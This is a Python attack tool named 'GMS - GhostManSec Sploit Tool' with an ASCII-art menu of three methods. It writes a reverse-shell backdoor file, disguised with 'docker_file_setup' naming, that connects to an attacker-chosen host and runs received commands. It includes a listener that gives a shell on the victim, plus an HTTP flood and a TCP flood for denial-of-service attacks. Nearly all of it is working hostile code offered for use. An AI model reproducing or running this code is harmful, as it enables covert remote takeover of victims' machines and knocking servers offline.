import colorama
import os
import requests
import random
import socket
import sys
import subprocess
import re
import threading
import aiohttp
import asyncio
from colorama import Fore
from colorama import Style
from colorama import Back

colorama.init()

os.system('cls' if os.name == 'nt' else 'clear')

print(f'''

{Fore.RED}GMS - GhostManSec Sploit Tool
{Fore.RED}Dev By : @ghostman_s3c{Style.RESET_ALL}
{Fore.RED}
  .:'                                  `:.
 ::'                                    `::
:: :.                                  .: ::
 `:. `:.             .             .:'  .:'
   `::. `::          !           ::' .::'
      `::.`::.    .' ! `.    .::'.::'
        `:.  `::::'':!:``::::'   ::'
        :'*:::.  .:' ! `:.  .:::*`:
       :: HHH::.   ` ! '   .::HHH ::
      ::: `H TH::.  `!'  .::HT H' :::
      ::..  `THHH:`:   :':HHHT'  ..::
      `::      `T: `. .' :T'      ::'
        `:. .   :         :   . .:'
          `::'               `::'
            :'  .`.  .  .'.  `:
            :' ::.       .:: `:
            :' `:::     :::' `:
             `.  ``     ''  .'
              :`...........':
              ` :`.     .': '
               `:  `"""'  :'{Style.RESET_ALL}   Ronald Allan Stanions
{Style.RESET_ALL}
     =[ GMS v1.4-dev                  ]
+-- -=[ Copyright By {Fore.BLUE}Ph4mCh13n{Style.RESET_ALL}        ]
+-- -=[ Twitter : {Fore.WHITE}{Back.GREEN}@ghostman_s3c{Style.RESET_ALL}       ]
+-- -=[ Email : amous4484@gmail.com   ]

DMS document : https://ghostmanews.blogspot.com
N/A''')
print(f'''
{Fore.WHITE}{Back.RED}Warning Cyber Secutity{Style.RESET_ALL}
Options Payloads :
+-- -=[ 1 Malware Method              ]
+-- -=[ 2 Stresser DDoS Attack Method ]
{Fore.BLUE}[*]{Style.RESET_ALL} Please use according to the provisions of Law
---
method :
    1), Backdoor Created ({Fore.RED + Style.BRIGHT}WARNING MALWARE{Style.RESET_ALL}) 
    2), Attack the server's bandwidth is overloaded ({Fore.RED}{Style.BRIGHT}WARNING DDoS{Style.RESET_ALL})
    3), DDoS attack TCP, UDP Attack ({Fore.RED}{Style.BRIGHT}WARNING DDoS{Style.RESET_ALL})
---
''')

choose = input("choose method : ")

if choose == "1":
    import os
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{Fore.RED}
        _.---**""**-.       
._   .-'           /|`.     
 \`.'             / |  `.   
  V              (  ;    \  
  L       _.-  -. `'      \ 
 / `-. _.'       \         ;
:            __   ;    _   |
:`-.___.+-*"': `  ;  .' `. |
|`-/     `--*'   /  /  /`.\|
: :              \    :`.| ;
| |   .           ;/ .' ' / 
: :  / `             :__.'  
 \`._.-'       /     |      
  : )         :      ;      
  :----.._    |     /       
 : .-.    `.       /        
  \     `._       /         
  /`-            /          
 :             .'           
  \ )       .-'             
   `-----*"'     [GMS]
   [Backdoor Method       ]
   [Copyright : Phamchien ]
{Style.RESET_ALL}
''')
    def backdoor():
        import socket
        import sys

        HOST = input("set (Local Host) LHOST : ")
        print("")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} LOCAL HOST => {HOST}")
        print()
        PORT = int(input("set (Local Port) LPORT : "))
        print("")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} LOCAL PORT => {PORT}")
        print()
        NAME_FILE = input("set FILE NAME : ")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} FILE NAME => {NAME_FILE}")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Starting Created File {NAME_FILE}")
        code = f'''
import socket
import random
import subprocess

RHOST = '{HOST}'
RPORT = {PORT}

def setup():
    docker_file_setup = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    docker_file_setup.connect((RHOST, RPORT))
    print("[+] Starting Setup...")
    while True:
        temp = docker_file_setup.recv(10024)
        if temp == "exit":
            s.close()
            print("[-] setup failed , please again..")
            exit()
        else:
            procs = subprocess.Popen(
                temp,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            data_setup = procs.stdout.read() + procs.stderr.read()
            docker_file_setup.send(data_setup)
            data = random.randint(1111111111, 9999999999)
            print("[-] Starting Setup", data)
setup()
'''
        with open(f'{NAME_FILE}.py', 'w') as files:
            content = files.write(code)
            print(f'{Fore.BLUE}[*]{Style.RESET_ALL} Created Success {content}')

        handler_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        handler_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        handler_tcp.bind((HOST, PORT))
        handler_tcp.listen(1)

        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Server Handler is listenning on {HOST}:{PORT}...")
        conn, addr = handler_tcp.accept()
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Start Session on victim {addr[0]} and port {addr[1]}....")
        
        while True:
            sys.stdout.write(f'\nshell@{addr[0]} > ')
            shell_cmd = sys.stdin.readline()
            if shell_cmd == "exit\n":
                print(f"{Fore.RED}[-]{Style.RESET_ALL} Session Exited..")
                conn.send(b'exit\n')
                conn.close()
                break

            elif shell_cmd != "\n":
                conn.send(shell_cmd.encode())
                output = conn.recv(10024)
                print("\n", output.decode())

    backdoor()
elif choose == "2":
    os.system('cls' if os.name == 'nt' else 'clear')
    print('''
         .AMMMMMMMMMMA.          
       .AV. :::.:.:.::MA.        
      A' :..        : .:`A       
     A'..              . `A.     
    A' :.    :::::::::  : :`A    
    M  .    :::.:.:.:::  . .M    
    M  :   ::.:.....::.:   .M    
    V : :.::.:........:.:  :V    
   A  A:    ..:...:...:.   A A   
  .V  MA:.....:M.::.::. .:AM.M   
 A'  .VMMMMMMMMM:.:AMMMMMMMV: A  
:M .  .`VMMMMMMV.:A `VMMMMV .:M: 
 V.:.  ..`VMMMV.:AM..`VMV' .: V  
  V.  .:. .....:AMMA. . .:. .V   
   VMM...: ...:.MMMM.: .: MMV    
       `VM: . ..M.:M..:::M'      
         `M::. .:.... .::M       
          M:.  :. .... ..M       
 VK       V:  M:. M. :M .V       
          `V.:M.. M. :M.V'

    [ Method DDoS Attack Layer 7 ]
    [ Copyright : Pham CHien]
''')
    def exploit():
        URL = input("URL Target : ")
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Start DDoSing to Target : {URL}")
        while True:
            user = [
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
                "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
            ]
            async def send_rq(user):
                async with aiohttp.ClientSession() as session:
                    agent = random.choice(user)
                    headers = {"User-Agent": agent}
                    async with session.get(URL, headers=headers) as rq:
                        if rq.status == 200:
                            pass
                        else:
                            pass
                        return rq.text
            async def main():
                threads = 1000

                nod = []
                for attack in range(threads):
                    nods = asyncio.ensure_future(send_rq(user))
                    nod.append(nods)

                await asyncio.gather(*nod * threads)
                await asyncio.gather(*nod * threads)

            if __name__ =='__main__':
                loop = asyncio.get_event_loop()
                loop.run_until_complete(main())

    exploit()
elif choose == "3":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{Fore.RED}{Style.BRIGHT}
    .... NO! ...                  ... MNO! ...
   ..... MNO!! ...................... MNNOO! ...
 ..... MMNO! ......................... MNNOO!! .
.... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .
 ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....
    ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...
   ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....
   ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...  
    ....... MMMMM..    OPPMMP    .,OMI! ....
     ...... MMMM::   o.,OPMP,.o   ::I!! ...
         .... NNM:::.,,OOPM!P,.::::!! ....
          .. MMNNNNNOOOOPMO!!IIPPO!!O! .....
         ... MMMMMNNNNOO:!!:!!IPPPPOO! ....
           .. MMMMMNNOOMMNNIIIPPPOO!! ......
          ...... MMMONNMMNNNIIIOO!..........
       ....... MN MOMMMNNNIIIIIO! OO ..........
    ......... MNO! IiiiiiiiiiiiI OOOO ...........
  ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........
   .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........
   ...... MNNNNO! .. PPPPPPPPP .. MMNON!........
      ...... OO! ................. ON! .......
         ................................{Style.RESET_ALL}
         -=--------------------------=-
         [ Method DDoS Attack TCP UDP ]
         [          Layer 4           ]
         [ Copyright By : Ph4m Ch13n  ]
         -=--------------------------=-
''')
    def attack():
        server = input("IP Target : ")
        port = int(input("Port Target "))
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Start DDoSing to Target : {server}:{port}")
        data = b"a" * (924 * 924 * 924)
        def attacks():
            while True:
                socks_ip = socket.socket(socket.AF_INET)
                socks_ip.connect((server, port))
                socks_ip.send(data)
                socks_ip.sendall(data)
                socks_ip.close()
        threads = []
        while True:
            t = threading.Thread(target=attacks())
            threads.append(t)
            t.start()
            t.join()
    attack()
else:
    print(f"{Fore.WHITE}{Back.RED}[FAILED]{Style.RESET_ALL} Not Found Number Method , Please Again..")
    exit()
